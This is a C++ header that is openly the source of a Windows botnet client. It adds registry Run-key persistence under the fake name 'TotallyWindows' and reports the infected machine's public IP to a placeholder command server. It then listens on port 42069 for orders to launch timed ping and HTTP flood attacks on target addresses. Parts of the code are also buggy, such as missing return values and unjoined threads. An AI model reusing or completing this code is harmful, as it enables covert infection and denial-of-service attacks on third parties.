#pragma once
#include <string>
#include <fstream>
#include <filesystem>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <chrono>
#include <cstdlib>
#include "../../Headers/cpp20_http_client.hpp"
#define DEFAULT_BUFLEN 512

WSADATA wsaData;
struct addrinfo* result = NULL, * ptr = NULL, hints;

struct ServSocket {
	SOCKET sock = INVALID_SOCKET;
	SOCKET clientsock = INVALID_SOCKET;

	ServSocket() = default;

	SOCKET start() {

		int uselessthrowaway;

		int startup;
		do {

			startup = WSAStartup(MAKEWORD(2, 2), &wsaData);

		} while (startup != 0);

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;
		hints.ai_flags = AI_PASSIVE;

		uselessthrowaway = getaddrinfo(NULL, "42069", &hints, &result);

		sock = INVALID_SOCKET;

		sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

		uselessthrowaway = bind(sock, result->ai_addr, (int)result->ai_addrlen);
		freeaddrinfo(result);

	}

	std::string await() {

		listen(sock, SOMAXCONN);
		clientsock = accept(sock, NULL, NULL);
		int resultbytes;
		char recvbuf[DEFAULT_BUFLEN];
		int recvbuflen = DEFAULT_BUFLEN;
		std::string recievedstring{};

		do {

			resultbytes = recv(clientsock, recvbuf, recvbuflen, 0);
			recievedstring.append(recvbuf, resultbytes);

		} while (resultbytes > 0);

		return recievedstring;

	}

};

void startup() {

	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string name = "TotallyWindows";

	HKEY hkey;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\MIcrosoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
		if (RegSetValueExA(hkey, name.c_str(), 0, REG_SZ, (const BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) { RegCloseKey(hkey); }
	}

}

namespace lib {

	void ping(std::string ip, std::string time) {

		auto timeint{ std::stoi(time) };
		auto secs{ std::chrono::minutes(timeint) };
		auto start{ std::chrono::steady_clock::now() };
		std::string command{ "ping -n 4 " + ip };

		do {

			system(command.c_str());

		} while (std::chrono::steady_clock::now() - start < secs);

	}

	void web(std::string ip, std::string time, bool https) {

		auto timeint{ std::stoi(time) };
		auto secs{ std::chrono::minutes(timeint) };
		auto start{ std::chrono::steady_clock::now() };

		if (https) {

			do {

				http_client::get("https://" + ip + "/").send();

			} while (std::chrono::steady_clock::now() - start < secs);

		}
		else {

			do {

				http_client::get("http://" + ip + "/").send();

			} while (std::chrono::steady_clock::now() - start < secs);

		}

	}

}

struct Command {

	std::string command;

	Command() = default;
	Command(std::string command) : command{ command } {};

	void run() {
		
		unsigned first, last;

		if (command.find("ping") != std::string::npos) {

			first = command.find("{ip");
			last = command.find("time");
			std::string ip{ command.substr(first,last - first) };

			first = last;
			last = command.find("}");
			std::string time{ command.substr(first,last - first) };

			std::thread pingthread(lib::ping, ip, time);

		}
		else if (command.find("web") != std::string::npos) {

			first = command.find("{ip");
			last = command.find("time");
			std::string ip{ command.substr(first,last - first) };

			first = last;
			last = command.find("https");
			std::string time{ command.substr(first,last - first) };

			first = last;
			last = command.find("}");
			bool https;
			std::string httpstr{ command.substr(first,last - first) };
			if (httpstr == "1") { https = true; }
			else { https = false; }

			std::thread webthread(lib::web, ip, time, https);

		}

	}

};

namespace FirstRun {

	static bool False() {

		std::filesystem::path fun{ std::filesystem::temp_directory_path() /= "firstrunjeb.pdf" };

		std::ifstream file{ fun.generic_string() };
		if (file.good()) { return true; }

	}

	static void FirstRun() {

		std::ofstream fun{ std::filesystem::temp_directory_path() /= "firstrunjeb.pdf" };
		fun.close();

		http_client::Response funny{ http_client::get("https://api.ipify.org?format=json").send() };
		std::string_view body{ funny.get_body_string() };
		unsigned first{ body.find(R"({"ip":")") };
		unsigned last{ body.find(R"("})") };
		std::string ip{ body.substr(first,last - first) };

		auto const r{ http_client::post("https://myurl/ips")
			.add_header({.name = "Content-Type", .value = "application/json"})
			.set_body(R"({"ip": ")" + ip + "})")
			.send()
		};

		startup();

	}

}

void Idle() {
	ServSocket socket;
	Command recieved;

	socket.start();

	do {

		recieved.command = socket.await();
		recieved.run();

	} while (true);


};
